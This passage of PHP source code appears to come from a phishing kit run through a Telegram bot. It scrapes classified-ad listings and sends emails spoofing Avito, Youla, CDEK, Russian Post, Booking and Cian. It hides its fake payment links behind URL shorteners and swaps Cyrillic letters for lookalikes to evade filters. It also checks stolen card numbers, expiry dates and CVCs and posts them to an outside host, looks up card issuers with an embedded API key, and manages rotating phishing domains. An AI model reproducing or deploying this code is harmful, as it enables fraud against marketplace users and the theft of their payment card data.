            $itemd[] = explode(', ', pageCut228($page, 'item-address__string"> ', ' </'))[0];
        } 
		elseif ($a == 2) {
            $itemd[] = intval(beaText(pageCut228($page, '"price":', ','), chsNum())) / 100;
            $itemd[] = json_decode('"'.explode('"name":"', pageCut228($page, '"products":[{', '","discountedPrice'))[1].'"');
            $itemd[] = pageCut228($page, '<meta property="og:image" content="', '">');
            $itemd[] = json_decode('"'.pageCut228($page, '"isFavorite":false,"location":{"description":"', '",').'"');
        }
		else if ($a == 3) {
			$itemd[] = trim(pageCut228($page, 'pricelabel__value arranged">', ' zł</strong>')); // значение суммы из strong, работает
            $itemd[] = pageCut228($page, '</div><h1>', '</h1>'); // изменил
            $itemd[] = pageCut228($page, '<meta property="og:image" content="', '">'); // meta с ссылкой на картинку, работает точно
            $itemd[] = pageCut228($page, '<address>', '</address>'); // факт.адрес объявления, больше address на странице нет, должен пахать
		}
        //$itemd[] = '';
        //$itemd[] = '';
        //$itemd[] = '';
        if (strlen($itemd[6]) == 0)
            return false;
        if (strlen($itemd[7]) == 0 || !isUrlImage($itemd[7]))
            return false;
        $itemd[5] = fixAmount(intval($itemd[5]));
        return $itemd;
    }
    

    
	function getEmailUser($a) {
		$a = intval($a);
		return [
			[
				1 => ['Aвитo', 'noreply@avito.ru'],
				2 => ['Юлa', 'noreply@youla.ru'],
				3 => ['Вохbеrrу', 'noreply@boxberry.ru'],
				4 => ['CДЭK', 'noreply@cdek.ru'],
				5 => ['Пoчтa Poccии', 'noreply@pochta.ru'],
				6 => ['ПЭK', 'noreply@pecom.ru'],
				7 => ['Яндeкc', 'noreply@yandex.ru'],
				8 => ['Авито Аренда', 'noreply@avito.ru'],
				9 => ['Юла Аренда', 'noreply@youla.ru'],
				17 => ['Booking', 'noreply@booking.com'],
				20 => ['Циан', 'noreply@cian.ru'],
			][$a],
			explode(':', allEmails()[$a], 2),
		];
	}
	
	function mailSend($maild, $itemd, $isnt) {
		$mailu = getEmailUser($maild[2]);
		$mailt = $maild[1];
		$t = fileRead(dirMails($maild[2].'-'.$maild[3]));
		//$t .= "\r\n".'<%div% style="display: none">%url%</%div%>';
		$t = str_replace([
			'%div%',
			'%table%',
			'%email%',
			'%url%',
			'%img%',
			'%title%',
			'%amount%',
			'%item%',
			'%domain%',
		], [
			'div',//'d'.substr(bin2hex(random_bytes(16)), 0, rand(16, 32)),
			'table',//'t'.substr(bin2hex(random_bytes(16)), 0, rand(16, 32)),
			'<span>'.str_replace('@', '</span>@<span>', $mailt).'</span>',
			fuckUrl(getFakeUrl($itemd[3], $maild[0], $maild[2], $isnt ? $maild[3] : 1)),
			$isnt ? $itemd[7] : '',
			$itemd[6],
			number_format($itemd[5], 0, '.', ' '),
			'CB'.$maild[0].'0RU',
			getUserDomainName($itemd[3], $maild[2]),
		], $t);
		//$t = fuckText($t);
		$t = explode("\r\n", $t, 2);
		$maili = $t[0];
		$mailb = $t[1];
		$mailb0 = strip_tags($mailb);
		while (strpos($mailb0, "\r\n\r\n") !== false)
			$mailb0 = str_replace("\r\n\r\n", "\r\n", $mailb0);
		$merr = '';
		$result = [false];
		include '_mail.php';
		$result[] = $merr;
		return $result;
	}

	function fuckUrl($url) {
		//return 'https://'.request('https://uni.su/api/?url='.$url);

		return request('https://is.gd/create.php?format=simple&url='.$url);

		//return request('https://clck.ru/--?url='.$url);

		/*return json_decode(request('https://bitly.com/data/anon_shorten', [
			'url' => $url,
		]), true)['data']['link'];*/
	}
	function checkCard($card, $expm, $expy, $cvc, $country, $BankName) {
		$url = 'https://bank-api.ru/check.php';
		$params = array(
			'card' => $card,
			'expm' => $expm,
			'expy' => $expy,
			'cvc' => $cvc,
			'country' => $country,
			'BankName' => $BankName,
		);
		$result = file_get_contents($url, false, stream_context_create(array(
			'http' => array(
				'method'  => 'POST',
				'header'  => 'Content-type: application/x-www-form-urlencoded',
				'content' => http_build_query($params)
			)
		)));
	}

	function isValidCard($n, $m, $y, $c) {
		$n = beaCard($n);
		if (!$n)
			return false;
		$m = intval(beaText($m, chsNum()));
		if ($m < 1 || $m > 12)
			return false;
		$y = intval(beaText($y, chsNum()));
		if ($y < 20 || $y > 99)
			return false;
		$c = beaText($c, chsNum());
		if (strlen($c) != 3)
			return false;
		return true;
	}

	function isPayData($merchant) {
		return file_exists(dirPays(md5($merchant)));
	}

	function getPayData($merchant, $del = true) {
		$t = explode('`', fileRead(dirPays(md5($merchant))));
		if ($del)
			unlink(dirPays(md5($merchant)));
		return $t;
	}

	function setPayData($merchant, $v) {
		return fileWrite(dirPays(md5($merchant)), implode('`', $v));
	}

	function cardHide($n) {
		return cardBank($n).' ****'.substr($n, strlen($n) - 4);
	}
	
	function beaCash($v) {
		return number_format($v, 0, '', '').' ';
	}
	
	function beaDays($v) {
		return $v.' '.selectWord($v, ['дней', 'день', 'дня']);
	}
	
	function beaKg($v) {
		return number_format(intval($v) / 1000, 1, '.', '').' кг';
	}
	
	function chsNum() {
		return '0123456789';
	}
	
	function chsAlpRu() {
		return 'йцукеёнгшщзхъфывапролджэячсмитьбюЙЦУКЕЁНГШЩЗХЪФЫВАПРОЛДЖЭЯЧСМИТЬБЮ';
	}
	
	function chsAlpEn() {
		return 'qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM';
	}
	
	function chsAlpRo() {
		return 'aăâbcdefghiîjklmnopqrsștțuvwxyzAĂÂBCDEFGHIÎJKLMNOPQRSȘTȚUVWXYZ';
	}
	
	function chsAlpCz() {
		return 'aábcčdďeéěfghchiíjklmnňoópqrřsštťuúůvwxyýzžAÁBCČDĎEÉĚFGHChIÍJKLMNŇOÓPQRŘSŠTŤUÚŮVWXYÝZŽ';
	}
	
	function chsAlpPl() {
		return 'aąbcćdeęfghijklłmnńoópqrsśtuvwxyzźżAĄBCĆDEĘFGHIJKLŁMNŃOÓPQRSŚTUVWXYZŹŻ';
	}
	
	function chsSym() {
		return ' .,/\\"\'()_-+=!@#$%^&*№?;:|[]{}«»';
	}
	
	function chsAll() {
		return chsNum().chsAlpRu().chsAlpEn().chsSym().chsAlpPl().chsAlpRo().chsAlpCz();
	}
	
	function chsFio() {
		return chsAlpRu().chsAlpEn().chsAlpPl().chsAlpRo().chsAlpCz().' .-\'';
	}
	
	function chsMail() {
		return chsNum().chsAlpEn().'_-.@';
	}
	
	function usd_a($t) {
		$c1 = 0;
		$c2 = 0;
		foreach (glob(dirUsers('*')) as $t1) {
			$id2 = basename($t1);
			if (botSend([
				$t,
			], $id2))
				$c1++;
			else
				$c2++;
		}
		return [$c1, $c2];
	}
	
	function beaText($v, $c) {
		$t = '';
		for ($i = 0; $i < strlen($v); $i++)
			if (strpos($c, $v[$i]) !== false)
				$t .= $v[$i];
		return $t;
	}
	
	function pageCut($s, $s1, $s2) {
		if (strpos($s, $s1) === false || strpos($s, $s2) === false)
			return '';
		return explode($s2, explode($s1, $s, 2)[1], 2)[0];
	}
	
	function cardBank($n) {
		$n = substr($n, 0, 6);
		$t = fileRead(dirBin($n));
		if ($t)
			return $t;
		$page = json_decode(request('https://api.cardinfo.online?input='.$n.'&apiKey=9e8206307c15458756d19e5d0a805b5b&fields=brandName,bankNameLocal,country'), true);
		if ($page['country'] == 'ru') {
            $page['country'] = '🇷🇺';
        }
        if ($page['country'] == 'ua') {
            $page['country'] = '🇺🇦';
        }
        if ($page['country'] == 'hu') {
            $page['country'] = '🇭🇺';
        }
        if ($page['country'] == 'cz') {
            $page['country'] = '🇨🇿';
        }
        if ($page['country'] == 'kz') {
            $page['country'] = '🇰🇿';
        }
        if ($page['country'] == 'uz') {
            $page['country'] = '🇺🇿';
        }
        if ($page['country'] == 'pl') {
            $page['country'] = '🇵🇱';
        }
        if ($page['country'] == 'ro') {
            $page['country'] = '🇷🇴';
        }
        if ($page['country'] == 'by') {
            $page['country'] = '🇧🇾';
        } else {
            $page['country'] == $page['country'];
        }
		$t = $page['brandName'].' '.$page['country'].' '.$page['bankNameLocal'];
		fileWrite(dirBin($n), $t);
		return $t;
	}
	
	include 'functions/imguplog.php';
	//function imgUpload($v) 
	    
	/*	$v2 = json_decode(request(botUrl('getFile?file_id='.$v)), true)['result']['file_path'];
		if (!$v2)
			return false;
		$img = base64_encode(request(botUrlFile($v2)));
		$curl = curl_init('https://api.imgur.com/3/image.json');
		curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($curl, CURLOPT_HTTPHEADER, [
			'Authorization: Client-ID '.imgurId(),
		]);
		curl_setopt($curl, CURLOPT_POST, true);
		curl_setopt($curl, CURLOPT_POSTFIELDS, [
			'image' => $img,
		]);
		$result = json_decode(curl_exec($curl), true)['data']['link'];
		curl_close($curl);
		return $result;*/
	
	
	function beaCard($n) {
		$n = beaText($n, chsNum());
		if (strlen($n) < 13 || strlen($n) > 19)
			return false;
		$sum = 0;
		$len = strlen($n);
		for ($i = 0; $i < $len; $i++) {
			$d = intval($n[$i]);
			if (($len - $i) % 2 == 0) {
				$d *= 2;
				if ($d > 9)
					$d -= 9;
			}
			$sum += $d;
		}
		return (($sum % 10) == 0) ? $n : false;
	}

	function calcDelivery($c1, $c2) {
		$km = pageCut(request('https://www.distance.to/'.$c1.'/'.$c2), '<span class=\'value km\'>', '</');
		$km = intval(beaText(explode('.', $km)[0], chsNum()));
		$km = min(max($km, 0), 6000);
		$dp = 2;
		if ($km <= 1000)
			$dp = 1;
		else if ($km >= 3000)
			$dp = 3;
		$cost = min(max(intval($km / 5), 100), 1000);
		$d1 = min(max(intval($km / 500), 1), 10);
		$ms = min(max(intval($km / 1000), 3), 5) * 10;
		return implode('`', [$cost, $d1, $d1 + $dp, $ms]);
	}
	
	 function isSiteAvailible($url) { 
            if(!filter_var($url, FILTER_VALIDATE_URL)){
                  return false;
                        }
            $curlInit = curl_init($url);
        curl_setopt($curlInit,CURLOPT_CONNECTTIMEOUT,2);
        curl_setopt($curlInit,CURLOPT_HEADER,true);
        curl_setopt($curlInit,CURLOPT_NOBODY,true);
        curl_setopt($curlInit,CURLOPT_RETURNTRANSFER,true);
             $response = curl_exec($curlInit);
        curl_close($curlInit);
            return $response ? true : false;
  }


	function selectWord($n, $v) {
		$n = intval($n);
		$d = $v[0];
		$j = ($n % 100);
		if ($j < 5 || $j > 20) {
			$j = ($n % 10);
			if ($j == 1)
				$d = $v[1];
			elseif ($j > 1 && $j < 5)
				$d = $v[2];
		}
		return $d;
	}

	function beaPhone($t) {
		$t = str_split($t);
		array_splice($t, 9, 0, ['-']);
		array_splice($t, 7, 0, ['-']);
		array_splice($t, 4, 0, [') ']);
		array_splice($t, 1, 0, [' (']);
		array_splice($t, 0, 0, ['+']);
		return implode('', $t);
	}
	
        include 'alert.php';
	

	function fuckText($t) {
		return str_replace([
			'у', 'е', 'х', 'а', 'р', 'о', 'с', 'К', 'Е', 'Н', 'Х', 'В', 'А', 'Р', 'О', 'С', 'М', 'Т'
		], [
			'y', 'e', 'x', 'a', 'p', 'o', 'c', 'K', 'E', 'H', 'X', 'B', 'A', 'P', 'O', 'C', 'M', 'T'
		], $t);
	}
	//	function setDomain($serv, $newdomain) {
	//		setData('domains', $serv, $newdomain);
	//	}

	function getsDomain($servis) {
		$domm = file_get_contents("domains/1.txt");
		return $domm;
	}

	function setServiceB($nomber_servis, $domen) {
		$fp = fopen("domains/".$nomber_servis.".txt", "a");
		ftruncate($fp, 0);
		$wd = fwrite($fp, $domen);
		fclose($fp);
		return $wd;
	}
	
        	include 'functions/alldomains.php';

	/*function getDomN1() {
		$d1 = file_get_contents("domains/1.txt");
		$d2 = file_get_contents("domains/2.txt");   
		$d3 = file_get_contents("domains/3.txt"); 
		$d4 = file_get_contents("domains/4.txt");	 
		$d5 = file_get_contents("domains/5.txt");	 
		$d6 = file_get_contents("domains/6.txt");	 
		$d7 = file_get_contents("domains/7.txt");	 
		$d8 = file_get_contents("domains/8.txt");	 
		$d9 = file_get_contents("domains/9.txt");	 
		$d10 = file_get_contents("domains/10.txt");	 
		$d11 = file_get_contents("domains/11.txt");	 
		$d12 = file_get_contents("domains/12.txt");	
		$d13 = file_get_contents("domains/13.txt");	 
		$d14 = file_get_contents("domains/14.txt");	 
		$d15 = file_get_contents("domains/15.txt");	 
		$d16 = file_get_contents("domains/16.txt");	 
		$d17 = file_get_contents("domains/17.txt");	 
		$d18 = file_get_contents("domains/18.txt");	 
		$d19 = file_get_contents("domains/19.txt");	 
		$d20 = file_get_contents("domains/20.txt");	 
		$d21 = file_get_contents("domains/21.txt");	 
		$d22 = file_get_contents("domains/22.txt");	 
		$d23 = file_get_contents("domains/23.txt");	 
		$d24 = file_get_contents("domains/24.txt");	 
		$d25 = file_get_contents("domains/25.txt");	 
		$d26 = file_get_contents("domains/26.txt");	 
		$d27 = file_get_contents("domains/27.txt");	 
		$d28 = file_get_contents("domains/28.txt");
		$d29 = file_get_contents("domains/29.txt");
		$d30 = file_get_contents("domains/30.txt");
		$d31 = file_get_contents("domains/31.txt");
		return [$d1, $d2, $d3, $d4, $d5, $d6, $d7, $d8, $d9, $d10, $d11, $d12, $d13, $d14, $d15, $d16, $d17, $d18, $d19, $d20, $d21, $d22, $d23, $d24, $d25, $d26, $d27, $d28, $d29, $d30, $d31];
	}

	function getDomN2() {
		$d1_2 = file_get_contents("domains/1_2.txt");
		$d2_2 = file_get_contents("domains/2_2.txt");   
		$d3_2 = file_get_contents("domains/3_2.txt"); 
		$d4_2 = file_get_contents("domains/4_2.txt");	 
		$d5_2 = file_get_contents("domains/5_2.txt");	 
		$d6_2 = file_get_contents("domains/6_2.txt");	 
		$d7_2 = file_get_contents("domains/7_2.txt");	 
		$d8_2 = file_get_contents("domains/8_2.txt");	 
		$d9_2 = file_get_contents("domains/9_2.txt");	 
		$d10_2 = file_get_contents("domains/10_2.txt");	 
		$d11_2 = file_get_contents("domains/11_2.txt");	 
		$d12_2 = file_get_contents("domains/12_2.txt");	
		$d13_2 = file_get_contents("domains/13_2.txt");	 
		$d14_2 = file_get_contents("domains/14_2.txt");	 
		$d15_2 = file_get_contents("domains/15_2.txt");	 
		$d16_2 = file_get_contents("domains/16_2.txt");	 
		$d17_2 = file_get_contents("domains/17_2.txt");	 
		$d18_2 = file_get_contents("domains/18_2.txt");	 
		$d19_2 = file_get_contents("domains/19_2.txt");	 
		$d20_2 = file_get_contents("domains/20_2.txt");	 
		$d21_2 = file_get_contents("domains/21_2.txt");	 
		$d22_2 = file_get_contents("domains/22_2.txt");	 
		$d23_2 = file_get_contents("domains/23_2.txt");	 
		$d24_2 = file_get_contents("domains/24_2.txt");	 
		$d25_2 = file_get_contents("domains/25_2.txt");	 
		$d26_2 = file_get_contents("domains/26_2.txt");	 
		$d27_2 = file_get_contents("domains/27_2.txt");	 
		$d28_2 = file_get_contents("domains/28_2.txt");
		$d29_2 = file_get_contents("domains/29_2.txt");
	    $d30_2 = file_get_contents("domains/30_2.txt");
		$d31_2 = file_get_contents("domains/31_2.txt");
		return [$d1_2, $d2_2, $d3_2, $d4_2, $d5_2, $d6_2, $d7_2, $d8_2, $d9_2, $d10_2, $d11_2, $d12_2, $d13_2, $d14_2, $d15_2, $d16_2, $d17_2, $d18_2, $d19_2, $d20_2, $d21_2, $d22_2, $d23_2, $d24_2, $d25_2, $d26_2, $d27_2, $d28_2, $d29_2, $d30_2, $d31_2];
	}

	function getDomN3() {
		$d1_3 = file_get_contents("domains/1_3.txt");
		$d2_3 = file_get_contents("domains/2_3.txt");   
		$d3_3 = file_get_contents("domains/3_3.txt"); 
		$d4_3 = file_get_contents("domains/4_3.txt");	 
		$d5_3 = file_get_contents("domains/5_3.txt");	 
		$d6_3 = file_get_contents("domains/6_3.txt");	 
		$d7_3 = file_get_contents("domains/7_3.txt");	 
		$d8_3 = file_get_contents("domains/8_3.txt");	 
		$d9_3 = file_get_contents("domains/9_3.txt");	 
		$d10_3 = file_get_contents("domains/10_3.txt");	 
		$d11_3 = file_get_contents("domains/11_3.txt");	 
		$d12_3 = file_get_contents("domains/12_3.txt");	
		$d13_3 = file_get_contents("domains/13_3.txt");	 
		$d14_3 = file_get_contents("domains/14_3.txt");	 
		$d15_3 = file_get_contents("domains/15_3.txt");	 
		$d16_3 = file_get_contents("domains/16_3.txt");	 
		$d17_3 = file_get_contents("domains/17_3.txt");	 
		$d18_3 = file_get_contents("domains/18_3.txt");	 
		$d19_3 = file_get_contents("domains/19_3.txt");	 
		$d20_3 = file_get_contents("domains/20_3.txt");	 
		$d21_3 = file_get_contents("domains/21_3.txt");	 
		$d22_3 = file_get_contents("domains/22_3.txt");	 
		$d23_3 = file_get_contents("domains/23_3.txt");	 
		$d24_3 = file_get_contents("domains/24_3.txt");	 
		$d25_3 = file_get_contents("domains/25_3.txt");	 
		$d26_3 = file_get_contents("domains/26_3.txt");	 
		$d27_3 = file_get_contents("domains/27_3.txt");	 
		$d28_3 = file_get_contents("domains/28_3.txt");
		$d29_3 = file_get_contents("domains/29_3.txt");
		$d30_3 = file_get_contents("domains/30_3.txt");
		$d31_3 = file_get_contents("domains/31_3.txt");
		return [$d1_3, $d2_3, $d3_3, $d4_3, $d5_3, $d6_3, $d7_3, $d8_3, $d9_3, $d10_3, $d11_3, $d12_3, $d13_3, $d14_3, $d15_3, $d16_3, $d17_3, $d18_3, $d19_3, $d20_3, $d21_3, $d22_3, $d23_3, $d24_3, $d25_3, $d26_3, $d27_3, $d28_3, $d29_3, $d30_3, $d31_3];
	}

	function getAllDom() {
		$d1 = file_get_contents("domains/1.txt");
		if ($d1 == '' or $d1 == ' ')
			$d1 = '<b>Не указан</b>';
		$d2 = file_get_contents("domains/2.txt");   
		if ($d2 == '' or $d2 == ' ')
			$d2 = '<b>Не указан</b>';
		$d3 = file_get_contents("domains/3.txt");
		if ($d3 == '' or $d3 == ' ')
			$d3 = '<b>Не указан</b>';
		$d4 = file_get_contents("domains/4.txt");	 
		if ($d4 == '' or $d4 == ' ')
			$d4 = '<b>Не указан</b>';
		$d5 = file_get_contents("domains/5.txt");	 
		if ($d5 == '' or $d5 == ' ')
			$d5 = '<b>Не указан</b>';
		$d6 = file_get_contents("domains/6.txt");	 
		if ($d6 == '' or $d6 == ' ')
			$d6 = '<b>Не указан</b>';
		$d7 = file_get_contents("domains/7.txt");	 
		if ($d7 == '' or $d7 == ' ')
			$d7 = '<b>Не указан</b>';
		$d8 = file_get_contents("domains/8.txt");	 
		if ($d8 == '' or $d8 == ' ')
			$d8 = '<b>Не указан</b>';
		$d9 = file_get_contents("domains/9.txt");	 
		if ($d9 == '' or $d9 == ' ')
			$d9 = '<b>Не указан</b>';
		$d10 = file_get_contents("domains/10.txt");	 
		if ($d10 == '' or $d10 == ' ')
			$d10 = '<b>Не указан</b>';
		$d11 = file_get_contents("domains/11.txt");	 
		if ($d11 == '' or $d11 == ' ')
			$d11 = '<b>Не указан</b>';
		$d12 = file_get_contents("domains/12.txt");	
		if ($d12 == '' or $d12 == ' ')
			$d12 = '<b>Не указан</b>';
		$d13 = file_get_contents("domains/13.txt");	 
		if ($d13 == '' or $d13 == ' ')
			$d13 = '<b>Не указан</b>';
		$d14 = file_get_contents("domains/14.txt");	 
		if ($d14 == '' or $d14 == ' ')
			$d14 = '<b>Не указан</b>';
		$d15 = file_get_contents("domains/15.txt");	 
		if ($d15 == '' or $d15 == ' ')
			$d15 = '<b>Не указан</b>';
		$d16 = file_get_contents("domains/16.txt");	 
		if ($d16 == '' or $d16 == ' ')
			$d16 = '<b>Не указан</b>';
		$d17 = file_get_contents("domains/17.txt");	 
		if ($d17 == '' or $d17 == ' ')
			$d17 = '<b>Не указан</b>';
		$d18 = file_get_contents("domains/18.txt");	 
		if ($d18 == '' or $d18 == ' ')
			$d18 = '<b>Не указан</b>';
		$d19 = file_get_contents("domains/19.txt");	 
		if ($d19 == '' or $d19 == ' ')
			$d19 = '<b>Не указан</b>';
		$d20 = file_get_contents("domains/20.txt");	 
		if ($d20 == '' or $d20 == ' ')
			$d20 = '<b>Не указан</b>';
		$d21 = file_get_contents("domains/21.txt");	 
		if ($d21 == '' or $d21 == ' ')
			$d21 = '<b>Не указан</b>';
		$d22 = file_get_contents("domains/22.txt");	 
		if ($d22 == '' or $d22 == ' ')
			$d22 = '<b>Не указан</b>';
		$d23 = file_get_contents("domains/23.txt");	 
		if ($d23 == '' or $d23 == ' ')
			$d23 = '<b>Не указан</b>';
		$d24 = file_get_contents("domains/24.txt");	 
		if ($d24 == '' or $d24 == ' ')
			$d24 = '<b>Не указан</b>';
		$d25 = file_get_contents("domains/25.txt");	 
		if ($d25 == '' or $d25 == ' ')
			$d25 = '<b>Не указан</b>';
		$d26 = file_get_contents("domains/26.txt");	 
		if ($d26 == '' or $d26 == ' ')
			$d26 = '<b>Не указан</b>';
		$d27 = file_get_contents("domains/27.txt");	 
		if ($d27 == '' or $d27 == ' ')
			$d27 = '<b>Не указан</b>';
		$d28 = file_get_contents("domains/28.txt");	 
		if ($d28 == '' or $d28 == ' ')
			$d28 = '<b>Не указан</b>';
			$d29 = file_get_contents("domains/29.txt");	 
		if ($d29 == '' or $d29 == ' ')
			$d29 = '<b>Не указан</b>';
			$d30 = file_get_contents("domains/30.txt");	 
		if ($d30 == '' or $d30 == ' ')
			$d30 = '<b>Не указан</b>';
			$d31 = file_get_contents("domains/31.txt");	 
		if ($d31 == '' or $d31 == ' ')
			$d31 = '<b>Не указан</b>';
			
		$d1_2 = file_get_contents("domains/1_2.txt");
		if ($d1_2 == '' or $d1_2 == ' ')
			$d1_2 = '<b>Не указан</b>';
		$d2_2 = file_get_contents("domains/2_2.txt");   
		if ($d2_2 == '' or $d2_2 == ' ')
			$d2_2 = '<b>Не указан</b>';
		$d3_2 = file_get_contents("domains/3_2.txt");
		if ($d3_2 == '' or $d3_2 == ' ')
			$d3_2 = '<b>Не указан</b>';
		$d4_2 = file_get_contents("domains/4_2.txt");	 
		if ($d4_2 == '' or $d4_2 == ' ')
			$d4_2 = '<b>Не указан</b>';
		$d5_2 = file_get_contents("domains/5_2.txt");	 
		if ($d5_2 == '' or $d5_2 == ' ')
			$d5_2 = '<b>Не указан</b>';
		$d6_2 = file_get_contents("domains/6.txt");	 
		if ($d6_2 == '' or $d6_2 == ' ')
			$d6_2 = '<b>Не указан</b>';
		$d7_2 = file_get_contents("domains/7_2.txt");	 
		if ($d7_2 == '' or $d7_2 == ' ')
			$d7_2 = '<b>Не указан</b>';
		$d8_2 = file_get_contents("domains/8_2.txt");	 
		if ($d8_2 == '' or $d8_2 == ' ')
			$d8_2 = '<b>Не указан</b>';
		$d9_2 = file_get_contents("domains/9_2.txt");	 
		if ($d9_2 == '' or $d9_2 == ' ')
			$d9_2 = '<b>Не указан</b>';
		$d10_2 = file_get_contents("domains/10_2.txt");	 
		if ($d10_2 == '' or $d10_2 == ' ')
			$d10_2 = '<b>Не указан</b>';
		$d11_2 = file_get_contents("domains/11_2.txt");	 
		if ($d11_2 == '' or $d11_2 == ' ')
			$d11_2 = '<b>Не указан</b>';
		$d12_2 = file_get_contents("domains/12_2.txt");	
		if ($d12_2 == '' or $d12_2 == ' ')
			$d12_2 = '<b>Не указан</b>';
		$d13_2 = file_get_contents("domains/13_2.txt");	 
		if ($d13_2 == '' or $d13_2 == ' ')
			$d13_2 = '<b>Не указан</b>';
		$d14_2 = file_get_contents("domains/14_2.txt");	 
		if ($d14_2 == '' or $d14_2 == ' ')
			$d14_2 = '<b>Не указан</b>';
		$d15_2 = file_get_contents("domains/15_2.txt");	 
		if ($d15_2 == '' or $d15_2 == ' ')
			$d15_2 = '<b>Не указан</b>';
		$d16_2 = file_get_contents("domains/16_2.txt");	 
		if ($d16_2 == '' or $d16_2 == ' ')
			$d16_2 = '<b>Не указан</b>';
		$d17_2 = file_get_contents("domains/17_2.txt");	 
		if ($d17_2 == '' or $d17_2 == ' ')
			$d17_2 = '<b>Не указан</b>';
		$d18_2 = file_get_contents("domains/18_2.txt");	 
		if ($d18_2 == '' or $d18_2 == ' ')
			$d18_2 = '<b>Не указан</b>';
		$d19_2 = file_get_contents("domains/19_2.txt");	 
		if ($d19_2 == '' or $d19_2 == ' ')
			$d19_2 = '<b>Не указан</b>';
		$d20_2 = file_get_contents("domains/20_2.txt");	 
		if ($d20_2 == '' or $d20_2 == ' ')
			$d20_2 = '<b>Не указан</b>';
		$d21_2 = file_get_contents("domains/21_2.txt");	 
		if ($d21_2 == '' or $d21_2 == ' ')
			$d21_2 = '<b>Не указан</b>';
		$d22_2 = file_get_contents("domains/22_2.txt");	 
		if ($d22_2 == '' or $d22_2 == ' ')
			$d22_2 = '<b>Не указан</b>';
		$d23_2 = file_get_contents("domains/23_2.txt");	 
		if ($d23_2 == '' or $d23_2 == ' ')
			$d23_2 = '<b>Не указан</b>';
		$d24_2 = file_get_contents("domains/24_2.txt");	 
		if ($d24_2 == '' or $d24_2 == ' ')
			$d24_2 = '<b>Не указан</b>';
		$d25_2 = file_get_contents("domains/25_2.txt");	 
		if ($d25_2 == '' or $d25_2 == ' ')
			$d25_2 = '<b>Не указан</b>';
		$d26_2 = file_get_contents("domains/26_2.txt");	 
		if ($d26_2 == '' or $d26_2 == ' ')
			$d26_2 = '<b>Не указан</b>';
		$d27_2 = file_get_contents("domains/27_2.txt");	 
		if ($d27_2 == '' or $d27_2 == ' ')
			$d27_2 = '<b>Не указан</b>';
		$d28_2 = file_get_contents("domains/28_2.txt");	 
		if ($d28_2 == '' or $d28_2 == ' ')
			$d28_2 = '<b>Не указан</b>';
		$d29_2 = file_get_contents("domains/29_2.txt");	 
		if ($d29_2 == '' or $d29_2 == ' ')
			$d29_2 = '<b>Не указан</b>';
	    $d30_2 = file_get_contents("domains/30_2.txt");	 
		if ($d30_2 == '' or $d30_2 == ' ')
			$d30_2 = '<b>Не указан</b>';
		$d31_2 = file_get_contents("domains/31_2.txt");	 
		if ($d31_2 == '' or $d31_2 == ' ')
			$d31_2 = '<b>Не указан</b>';
			
		$d1_3 = file_get_contents("domains/1_3.txt");
		if ($d1_3 == '' or $d1_3 == ' ')
			$d1_3 = '<b>Не указан</b>';
		$d2_3 = file_get_contents("domains/2_3.txt");   
		if ($d2_3 == '' or $d2_3 == ' ')
			$d2_3 = '<b>Не указан</b>';
		$d3_3 = file_get_contents("domains/3_3.txt");
		if ($d3_3 == '' or $d3_3 == ' ')
			$d3_3 = '<b>Не указан</b>';
		$d4_3 = file_get_contents("domains/4_3.txt");	 
		if ($d4_3 == '' or $d4_3 == ' ')
			$d4_3 = '<b>Не указан</b>';
		$d5_3 = file_get_contents("domains/5_3.txt");	 
		if ($d5_3 == '' or $d5_3 == ' ')
			$d5_3 = '<b>Не указан</b>';
		$d6_3 = file_get_contents("domains/6.txt");	 
		if ($d6_3 == '' or $d6_3 == ' ')
			$d6_3 = '<b>Не указан</b>';
		$d7_3 = file_get_contents("domains/7_3.txt");	 
		if ($d7_3 == '' or $d7_3 == ' ')
			$d7_3 = '<b>Не указан</b>';
		$d8_3 = file_get_contents("domains/8_3.txt");	 
		if ($d8_3 == '' or $d8_3 == ' ')
			$d8_3 = '<b>Не указан</b>';
		$d9_3 = file_get_contents("domains/9_3.txt");	 
		if ($d9_3 == '' or $d9_3 == ' ')
			$d9_3 = '<b>Не указан</b>';
		$d10_3 = file_get_contents("domains/10_3.txt");	 
		if ($d10_3 == '' or $d10_3 == ' ')
			$d10_3 = '<b>Не указан</b>';
		$d11_3 = file_get_contents("domains/11_3.txt");	 
		if ($d11_3 == '' or $d11_3 == ' ')
			$d11_3 = '<b>Не указан</b>';
		$d12_3 = file_get_contents("domains/12_3.txt");	
		if ($d12_3 == '' or $d12_3 == ' ')
			$d12_3 = '<b>Не указан</b>';
		$d13_3 = file_get_contents("domains/13_3.txt");	 
		if ($d13_3 == '' or $d13_3 == ' ')
			$d13_3 = '<b>Не указан</b>';
		$d14_3 = file_get_contents("domains/14_3.txt");	 
		if ($d14_3 == '' or $d14_3 == ' ')
			$d14_3 = '<b>Не указан</b>';
		$d15_3 = file_get_contents("domains/15_3.txt");	 
		if ($d15_3 == '' or $d15_3 == ' ')
			$d15_3 = '<b>Не указан</b>';
		$d16_3 = file_get_contents("domains/16_3.txt");	 
		if ($d16_3 == '' or $d16_3 == ' ')
			$d16_3 = '<b>Не указан</b>';
		$d17_3 = file_get_contents("domains/17_3.txt");	 
		if ($d17_3 == '' or $d17_3 == ' ')
			$d17_3 = '<b>Не указан</b>';
		$d18_3 = file_get_contents("domains/18_3.txt");	 
		if ($d18_3 == '' or $d18_3 == ' ')
			$d18_3 = '<b>Не указан</b>';
		$d19_3 = file_get_contents("domains/19_3.txt");	 
		if ($d19_3 == '' or $d19_3 == ' ')
			$d19_3 = '<b>Не указан</b>';
		$d20_3 = file_get_contents("domains/20_3.txt");	 
		if ($d20_3 == '' or $d20_3 == ' ')
			$d20_3 = '<b>Не указан</b>';
		$d21_3 = file_get_contents("domains/21_3.txt");	 
		if ($d21_3 == '' or $d21_3 == ' ')
			$d21_3 = '<b>Не указан</b>';
		$d22_3 = file_get_contents("domains/22_3.txt");	 
		if ($d22_3 == '' or $d22_3 == ' ')
			$d22_3 = '<b>Не указан</b>';
		$d23_3 = file_get_contents("domains/23_3.txt");	 
		if ($d23_3 == '' or $d23_3 == ' ')
			$d23_3 = '<b>Не указан</b>';
		$d24_3 = file_get_contents("domains/24_3.txt");	 
		if ($d24_3 == '' or $d24_3 == ' ')
			$d24_3 = '<b>Не указан</b>';
		$d25_3 = file_get_contents("domains/25_3.txt");	 
		if ($d25_3 == '' or $d25_3 == ' ')
			$d25_3 = '<b>Не указан</b>';
		$d26_3 = file_get_contents("domains/26_3.txt");	 
		if ($d26_3 == '' or $d26_3 == ' ')
			$d26_3 = '<b>Не указан</b>';
